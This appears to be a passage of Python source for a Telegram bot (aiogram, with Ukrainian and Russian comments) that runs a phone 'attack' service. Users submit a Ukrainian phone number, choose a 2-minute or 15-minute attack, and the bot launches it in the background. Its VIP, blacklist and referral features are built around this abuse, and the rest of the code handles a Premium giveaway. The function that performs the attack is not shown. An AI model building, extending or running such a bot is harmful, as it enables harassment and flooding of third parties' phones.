        # Номери телефону зазвичай мають 10-12 цифр (0XXXXXXXXX або 380XXXXXXXXX)
        # Якщо число не відповідає цьому формату, або не починається з 380/0, то це може бути ID
        if len(cleaned_number) < 10 or len(cleaned_number) > 12:
            # Це точно не номер телефону - пропускаємо
            return
        if not (cleaned_number.startswith('380') or cleaned_number.startswith('0')):
            # Це може бути ID користувача або інше число - не обробляємо як номер телефону
            return
    
    number = re.sub(r'\D', '', number)
    if number.startswith('0'):
        number = '380' + number[1:]

    if len(number) == 12 and number.startswith('380'):
        async with db_pool.acquire() as conn:
            is_blacklisted = await conn.fetchval("SELECT 1 FROM blacklist WHERE phone_number = $1", number)
        if is_blacklisted:
            await message.answer(f"Номер <i>{number}</i> захищений від атаки.", parse_mode="html")
            return

        # Перевіряємо чи немає вже активної атаки для цього користувача (в private чатах chat_id == user_id)
        if active_attacks.get(chat_id, False):
            cancel_keyboard = get_cancel_keyboard()
            await message.answer("⏳ У вас вже активна атака. Зачекайте поки вона завершиться або зупиніть її.", reply_markup=cancel_keyboard)
            return
        
        # Зберігаємо номер телефону в стані та показуємо вибір типу атаки
        if state is None:
            state = FSMContext(storage=dp.storage, chat=message.chat.id, user=message.from_user.id)
        
        await state.update_data(phone_number=number)
        await state.set_state(Dialog.choose_attack_type)
        
        # Створюємо клавіатуру для вибору типу атаки
        attack_type_keyboard = types.InlineKeyboardMarkup()
        short_attack_btn = types.InlineKeyboardButton(text='⚡ Коротка (2 хв)', callback_data='attack_short')
        long_attack_btn = types.InlineKeyboardButton(text='🔥 Довга (15 хв)', callback_data='attack_long')
        attack_type_keyboard.add(short_attack_btn)
        attack_type_keyboard.add(long_attack_btn)
        
        # Додаємо кнопку "Скасувати"
        cancel_btn = types.InlineKeyboardButton(text='❌ Скасувати', callback_data='cancel_attack_type')
        attack_type_keyboard.add(cancel_btn)
        
        await message.answer(
            f'📱 Номер: <i>{number}</i>\n\n'
            '🎯 Оберіть тип атаки:',
            parse_mode="html",
            reply_markup=attack_type_keyboard
        )
    else:
        await message.answer("🔢 Номер введено некоректно.\nСпробуйте ще раз \nФормат: <i>🇺🇦380XXXXXXXXX</i>", parse_mode="html")

@dp.callback_query_handler(lambda c: c.data == "cancel_attack")
async def cancel_attack(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id
    attack_flags[chat_id] = False
    # Видаляємо активну атаку користувача (в private чатах chat_id == user_id)
    active_attacks.pop(chat_id, None)
    await callback_query.answer("Зупиняємо...")
    try:
        msg_id = last_status_msg.get(chat_id)
        if msg_id:
            await bot.edit_message_text("🛑 Зупиняємо атаку...", chat_id=chat_id, message_id=msg_id)
    except Exception:
        pass

@dp.callback_query_handler(lambda c: c.data == "cancel_attack_type", state=Dialog.choose_attack_type)
async def cancel_attack_type_choice(callback_query: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await callback_query.message.edit_text("❌ Вибір типу атаки скасовано.")
    await callback_query.answer("Скасовано")

@dp.callback_query_handler(lambda c: c.data and c.data.startswith("block_number_"))
async def block_number_handler(callback_query: types.CallbackQuery, state: FSMContext):
    """Обробник для блокування номера"""
    user_id = callback_query.from_user.id
    number = callback_query.data.replace("block_number_", "")
    
    # Перевіряємо чи користувач має права (VIP або адмін)
    if not await check_vip_status(user_id) and user_id not in ADMIN:
        await callback_query.answer("❌ Недостатньо прав для блокування номера.", show_alert=True)
        return
    
    try:
        async with db_pool.acquire() as conn:
            # Додаємо номер до чорного списку з інформацією про того, хто заблокував
            await conn.execute(
                "INSERT INTO blacklist (phone_number, blocked_by) VALUES ($1, $2) ON CONFLICT (phone_number) DO UPDATE SET blocked_by = $2",
                number, user_id
            )
        
        await callback_query.answer("✅ Номер заблоковано!")
        
        # Оновлюємо повідомлення без кнопок блокування/розблокування
        attack_type_keyboard = types.InlineKeyboardMarkup()
        short_attack_btn = types.InlineKeyboardButton(text='⚡ Коротка (2 хв)', callback_data='attack_short')
        long_attack_btn = types.InlineKeyboardButton(text='🔥 Довга (15 хв)', callback_data='attack_long')
        attack_type_keyboard.add(short_attack_btn)
        attack_type_keyboard.add(long_attack_btn)
        
        cancel_btn = types.InlineKeyboardButton(text='❌ Скасувати', callback_data='cancel_attack_type')
        attack_type_keyboard.add(cancel_btn)
        
        await callback_query.message.edit_text(
            f'📱 Номер: <i>{number}</i>\n\n'
            f'🔒 Номер заблоковано!\n\n'
            '🎯 Оберіть тип атаки:',
            parse_mode="html",
            reply_markup=attack_type_keyboard
        )
    except Exception as e:
        logging.error(f"Помилка при блокуванні номера: {e}")
        await callback_query.answer("❌ Помилка при блокуванні номера.", show_alert=True)

@dp.callback_query_handler(lambda c: c.data and c.data.startswith("unblock_number_"))
async def unblock_number_handler(callback_query: types.CallbackQuery, state: FSMContext):
    """Обробник для розблокування номера"""
    user_id = callback_query.from_user.id
    number = callback_query.data.replace("unblock_number_", "")
    
    # Перевіряємо чи користувач має права (VIP або адмін)
    if not await check_vip_status(user_id) and user_id not in ADMIN:
        await callback_query.answer("❌ Недостатньо прав для розблокування номера.", show_alert=True)
        return
    
    try:
        async with db_pool.acquire() as conn:
            # Перевіряємо чи номер є в чорному списку та хто його заблокував
            blocked_info = await conn.fetchrow("SELECT blocked_by FROM blacklist WHERE phone_number = $1", number)
            if not blocked_info:
                await callback_query.answer("❌ Номер не знайдено в чорному списку.", show_alert=True)
                return
            
            blocked_by = blocked_info['blocked_by']
            
            # Перевіряємо чи користувач має права на розблокування
            # Адміни можуть розблоковувати будь-які номери
            # Користувачі можуть розблоковувати тільки свої номери
            if user_id not in ADMIN:
                if blocked_by is None:
                    # Старий запис без blocked_by - тільки адміни можуть розблокувати
                    await callback_query.answer("❌ Цей номер може розблокувати тільки адміністратор.", show_alert=True)
                    return
                elif blocked_by != user_id:
                    await callback_query.answer("❌ Ви не можете розблокувати цей номер. Його може розблокувати тільки той, хто його заблокував.", show_alert=True)
                    return
            
            # Видаляємо номер з чорного списку
            await conn.execute("DELETE FROM blacklist WHERE phone_number = $1", number)
        
        await callback_query.answer("✅ Номер розблоковано!")
        
        # Оновлюємо повідомлення без кнопок блокування/розблокування
        attack_type_keyboard = types.InlineKeyboardMarkup()
        short_attack_btn = types.InlineKeyboardButton(text='⚡ Коротка (2 хв)', callback_data='attack_short')
        long_attack_btn = types.InlineKeyboardButton(text='🔥 Довга (15 хв)', callback_data='attack_long')
        attack_type_keyboard.add(short_attack_btn)
        attack_type_keyboard.add(long_attack_btn)
        
        cancel_btn = types.InlineKeyboardButton(text='❌ Скасувати', callback_data='cancel_attack_type')
        attack_type_keyboard.add(cancel_btn)
        
        await callback_query.message.edit_text(
            f'📱 Номер: <i>{number}</i>\n\n'
            f'🔓 Номер розблоковано!\n\n'
            '🎯 Оберіть тип атаки:',
            parse_mode="html",
            reply_markup=attack_type_keyboard
        )
    except Exception as e:
        logging.error(f"Помилка при розблокуванні номера: {e}")
        await callback_query.answer("❌ Помилка при розблокуванні номера.", show_alert=True)

@dp.callback_query_handler(lambda c: c.data in ["attack_short", "attack_long"], state=Dialog.choose_attack_type)
async def handle_attack_type_choice(callback_query: types.CallbackQuery, state: FSMContext):
    chat_id = callback_query.message.chat.id
    user_id = callback_query.from_user.id
    attack_type = callback_query.data
    
    # Отримуємо номер телефону зі стану
    data = await state.get_data()
    number = data.get('phone_number')
    
    if not number:
        await callback_query.answer("❌ Помилка: номер телефону не знайдено. Спробуйте ще раз.")
        await state.finish()
        return
    
    # Перевіряємо чи номер не заблокований
    async with db_pool.acquire() as conn:
        is_blacklisted = await conn.fetchval("SELECT 1 FROM blacklist WHERE phone_number = $1", number)
    if is_blacklisted:
        await callback_query.answer("❌ Номер заблокований і захищений від атаки.", show_alert=True)
        await state.finish()
        return
    
    # Перевіряємо чи немає вже активної атаки
    if active_attacks.get(chat_id, False):
        await callback_query.answer("⏳ У вас вже активна атака. Зачекайте поки вона завершиться або зупиніть її.")
        await state.finish()
        return
    
    # Визначаємо параметри атаки
    if attack_type == "attack_short":
        timeout = 120  # 2 хвилини
        attack_name = "Коротка (2 хв)"
        sleep_between_cycles = 4.0  # Затримка між циклами для короткої атаки
    else:  # attack_long
        timeout = 900  # 15 хвилин
        attack_name = "Довга (15 хв)"
        sleep_between_cycles = 30.0  # 30 секунд між циклами для довгої атаки
    
    # Оновлюємо last_attack_date
    async with db_pool.acquire() as conn:
        kyiv_now = get_kyiv_datetime()
        await conn.execute(
            'UPDATE users SET last_attack_date = $1 WHERE user_id = $2',
            kyiv_now, user_id
        )
    
    # Позначаємо що атака активна
    active_attacks[chat_id] = True
    attack_flags[chat_id] = True
    
    # Завершуємо стан FSM
    await state.finish()
    
    # Відправляємо повідомлення про початок атаки з кнопкою скасування
    cancel_keyboard = get_cancel_keyboard()
    status_msg = await callback_query.message.edit_text(
        f'🎯 Місія розпочата!\n\n'
        f'📱 Ціль: <i>{number}</i>\n'
        f'⚡ Тип: {attack_name}\n\n'
        f'⚡ Статус: В процесі...',
        parse_mode="html",
        reply_markup=cancel_keyboard
    )
    last_status_msg[chat_id] = status_msg.message_id
    
    # Запускаємо атаку з відповідними параметрами
    asyncio.create_task(start_attack(number, chat_id, timeout, sleep_between_cycles))
    
    await callback_query.answer(f"Атака {attack_name.lower()} запущена!")



async def user_exists(user_id: int) -> bool:
    """
    Проверяет, существует ли пользователь в базе данных
    """
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT 1 FROM users WHERE user_id = $1', user_id)
    return result is not None

# РОЗЫГРЫШ VIP-СТАТУСА

# Удалить этот обработчик:
# @dp.message_handler(lambda message: message.chat.type in ['group', 'supergroup'] and message.text and f'@{bot._me.username}' in message.text if hasattr(bot, '_me') else False)

# Добавить вместо него inline-обработчики:

@dp.inline_handler()
async def inline_giveaway(inline_query: types.InlineQuery):
    """Обработчик inline-запросов для розыгрыша"""
    user_id = inline_query.from_user.id
    
    # Перевіряємо, що inline-запит йде з групового чату
    # Якщо inline використовується в особистому чаті - не показуємо розіграш
    if inline_query.chat_type not in ['group', 'supergroup']:
        results = [
            types.InlineQueryResultArticle(
                id='group_only',
                title='🎪 Тільки для груп',
                description='Розіграш доступний тільки в групових чатах',
                input_message_content=types.InputTextMessageContent(
                    message_text='🎪 Розіграш Premium-статусу доступний лише в групових чатах!'
                )
            )
        ]
        await bot.answer_inline_query(inline_query.id, results, cache_time=1)
        return
    
    # Перевіряємо права користувача
    if user_id not in ADMIN:
        # Для обычных пользователей показываем "отказ"
        results = [
            types.InlineQueryResultArticle(
                id='no_access',
                title='🎪 Немає доступу',
                description='Тільки адміністратори можуть проводити розіграші',
                input_message_content=types.InputTextMessageContent(
                    message_text='🎪 Тільки адміністратори можуть проводити розіграші!'
                )
            )
        ]
    else:
        # Для админов показываем кнопку розыгрыша
        results = [
            types.InlineQueryResultArticle(
                id='start_giveaway',
                title='🎪 Розіграш Premium-статусу',
                description='Визначити випадкового переможця серед активних користувачів',
                input_message_content=types.InputTextMessageContent(
                    message_text='🎉 <b>Розіграш Premium-статусу</b>\n\nГотовий обрати випадкового переможця серед усіх активних користувачів бота!\nНатисніть кнопку нижче, щоб запустити розіграш 🎲',
                    parse_mode='HTML'
                ),
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🎪 Визначити переможця", callback_data="start_giveaway")
                )
            )
        ]
    
    await bot.answer_inline_query(inline_query.id, results, cache_time=1)

@dp.callback_query_handler(lambda c: c.data == "start_giveaway")
async def start_giveaway(callback_query: types.CallbackQuery):
    """Запуск розыгрыша VIP-статуса"""
    user_id = callback_query.from_user.id
    
    # Перевіряємо права
    if user_id not in ADMIN:
        await callback_query.answer("🚫 Недостатньо прав!", show_alert=True)
        return
    
    # Отримуємо інформацію про чат з inline_message_id або message
    chat_id = None
    message_id = None
    
    if callback_query.message:
        chat_id = callback_query.message.chat.id
        message_id = callback_query.message.message_id
        chat_type = callback_query.message.chat.type
    elif callback_query.inline_message_id:
        # Для inline-повідомлень запускаємо повну анімацію
        await callback_query.answer("🎰 Запускаю розыгрыш...")
        
        # Отримуємо список активних користувачів
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # Фільтруємо активних користувачів
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # Запускаємо анімацію для inline-повідомлення
        await run_inline_giveaway_animation(callback_query.inline_message_id, active_users)
        return
    else:
        await callback_query.answer("❌ Помилка: не вдалося визначити чат!", show_alert=True)
        return
    
    # Перевіряємо, що це груповий чат
    if chat_type not in ['group', 'supergroup']:
        await callback_query.answer("🚫 Розыгрыш доступен только в групповых чатах!", show_alert=True)
        return
    
    # Перевіряємо, чи не йде вже розіграш
    if giveaway_flags.get(chat_id):
        await callback_query.answer("⏳ Розыгрыш уже идет!", show_alert=True)
        return
    
    await callback_query.answer("🎰 Запускаю розыгрыш...")
    giveaway_flags[chat_id] = True
    
    try:
        # Отримуємо список активних користувачів
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # Фільтруємо активних користувачів (тех, кто не заблокировал бота)
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # Запускаем анимацию поиска
        await run_giveaway_animation(chat_id, message_id, active_users)
        
    except Exception as e:
        logging.error(f"Помилка в розіграші: {e}")
        try:
            await bot.edit_message_text(
                "❌ Сталася помилка при проведенні розіграшу!",
                chat_id=chat_id,
                message_id=message_id
            )
        except Exception as edit_error:
            logging.error(f"Помилка при редагуванні повідомлення: {edit_error}")
            try:
                await bot.send_message(chat_id, "❌ Сталася помилка при проведенні розіграшу!")
            except Exception as send_error:
                logging.error(f"Помилка при відправленні повідомлення: {send_error}")
    finally:
        giveaway_flags[chat_id] = False

async def run_giveaway_animation(chat_id: int, message_id: int, active_users: list):
    """Анимация розыгрыша с прогресс-баром"""
    import random
    
    # Повідомлення для анімації
    search_messages = [
        "🎪 Перемешиваю участников...",
        "⚡ Запускаю генератор случайных чисел...",
        "🎲 Крутится колесо фортуны...",
        "🎯 Почти готово...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # секунда на шаг
    
    for step in range(total_steps):
        if not giveaway_flags.get(chat_id):
            return
        
        # Створюємо прогрес-бар
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "▓" * filled + "░" * empty
        percentage = (step + 1) * 25     
        # Вибираємо повідомлення
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # Оновлюємо повідомлення
        text = f"🎉 <b>Розіграш Premium-статусу</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\n👥 Учасників: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Помилка оновлення повідомлення на кроці {step}: {e}")
            # Якщо не можемо редагувати, пропускаємо цей крок
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # Вибираємо переможця
    winner = random.choice(active_users)
    winner_name = winner['name'] or "Без имени"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # Формуємо посилання на профіль
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
        display_name = f"{winner_name} (@{winner_username})"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
        display_name = winner_name
    
    # Фінальне повідомлення
    final_text = (
        f"🎉 <b>Вітаємо переможця!</b>\n\n"
        f"🏆 Переможець розіграшу Premium-статусу:\n"
        f"👤 {profile_link}\n"
        f"🆔 ID: <code>{winner_id}</code>\n\n"
        f"🎊 Вітаємо з перемогою!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            chat_id=chat_id,
            message_id=message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"Помилка фінального повідомлення: {e}")
        # Якщо не можемо відредагувати, надсилаємо нове повідомлення
        try:
            await bot.send_message(chat_id, final_text, parse_mode='HTML')
        except Exception as send_error:
            logging.error(f"Помилка при відправленні фінального повідомлення: {send_error}")

async def run_inline_giveaway_animation(inline_message_id: str, active_users: list):
    """Анимация розыгрыша для inline-сообщений"""
    import random
    
    # Повідомлення для анімації
    search_messages = [
        "🎪 Перемешиваю участников...",
        "⚡ Запускаю генератор случайных чисел...",
        "✨ Определяю победителя...",
        "🎯 Почти готово...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # секунда на шаг
    
    for step in range(total_steps):
        # Створюємо прогрес-бар
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "▓" * filled + "░" * empty
        percentage = (step + 1) * 25
        
        # Вибираємо повідомлення
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # Оновлюємо повідомлення
        text = f"🎉 <b>Розіграш Premium-статусу</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\n👥 Учасників: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                inline_message_id=inline_message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Ошибка обновления inline-сообщения на шаге {step}: {e}")
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # Вибираємо переможця
    winner = random.choice(active_users)
    winner_name = winner['name'] or "Без имени"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # Формуємо посилання на профіль
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
    
    # Фінальне повідомлення
    final_text = (
        f"🎉 <b>Вітаємо переможця!</b>\n\n"
        f"🏆 Переможець розіграшу Premium-статусу:\n"
        f"👤 {profile_link}\n"
        f"🆔 ID: <code>{winner_id}</code>\n\n"
        f"🎊 Вітаємо з перемогою!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            inline_message_id=inline_message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"Помилка фінального inline-повідомлення: {e}")

# Додаю функцію для нарахування реферальних атак

async def check_and_expire_vip():
    """Фонова задача для перевірки та зняття закінченого VIP"""
    while True:
        try:
            await asyncio.sleep(3600)  # Перевіряємо кожну годину
            async with db_pool.acquire() as conn:
                now = get_kyiv_datetime()
                # Знаходимо всіх користувачів з закінченим VIP
                expired_users = await conn.fetch(
                    'SELECT user_id, name FROM users WHERE is_vip = TRUE AND vip_expires_at IS NOT NULL AND vip_expires_at < $1',
                    now
                )
                
                if expired_users:
                    count = 0
                    for user in expired_users:
                        try:
                            await conn.execute(
                                'UPDATE users SET is_vip = FALSE, vip_expires_at = NULL WHERE user_id = $1',
                                user['user_id']
                            )
                            try:
                                await bot.send_message(
                                    user['user_id'],
                                    "⏳ <b>Premium статус завершився</b>\n\n"
                                    "Дія Premium пройшла, доступ обмежено до стандартного рівня.",
                                    parse_mode="HTML",
                                    reply_markup=profile_keyboard
                                )
                            except Exception as notify_error:
                                logging.warning(f"Не вдалося повідомити користувача {user['user_id']} про закінчення VIP: {notify_error}")
                            count += 1
                            logging.info(f"VIP автоматично знято у користувача {user['user_id']} ({user['name']})")
                        except Exception as e:
                            logging.error(f"Помилка при знятті VIP у користувача {user['user_id']}: {e}")
                    
                    if count > 0:
                        logging.info(f"Автоматично знято VIP у {count} користувачів")
        except Exception as e:
            logging.error(f"Помилка в фоновій задачі перевірки VIP: {e}")
            await asyncio.sleep(3600)  # Зачекати перед наступною спробою

async def on_startup(dp):
    """Функція, яка викликається при старті бота"""
    logging.info("Запуск фонових задач...")
    # Запускаємо фонову задачу для автоматичного зняття закінченого VIP
    asyncio.create_task(check_and_expire_vip())
    logging.info("Фонові задачі запущено")

if __name__ == '__main__':
    logging.info("Запуск бота...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
